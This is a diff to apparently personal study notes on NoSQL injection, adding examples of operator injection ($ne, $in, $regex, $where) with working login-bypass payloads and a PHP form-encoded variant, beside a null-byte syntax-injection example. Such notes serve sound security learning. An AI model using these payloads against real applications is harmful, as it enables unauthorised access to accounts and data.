@@ -1,4 +1,4 @@
-### Syntax injection
+# Syntax injection
 This occurs when you can break the NoSQL query syntax, enabling you to inject your own payload. The methodology is similar to that used in SQL injection. However the nature of the attack varies significantly, as NoSQL databases use a range of query languages, types of query syntax, and different data structures.
 ### Test
 #### Determining which chars are processed
@@ -40,14 +40,22 @@ query:
 this.category == 'fizzy'\u0000' && this.released == 1
 ```
 
-
-
-### Operator injection
+# Operator injection
 Operator injection - This occurs when you can use NoSQL query operators to manipulate queries.
+* $where
+* $ne
+* $in
+* $regex
+#### Examples
+Query: `{"username":"wiener","password":"peter"}`
+Injections: 
+* `{"username":{"$ne":"invalid"},"password":"peter"}`
+* `{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}` 
+* `{"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""}}`
 
 
 
-(PHP) #php
+Example of `www-form-urlencoded` injection (PHP): #php
 `user[$ne]=test&pass[$ne]=asdf&remember=`
 
 ![[Pasted image 20250120063827.png]]
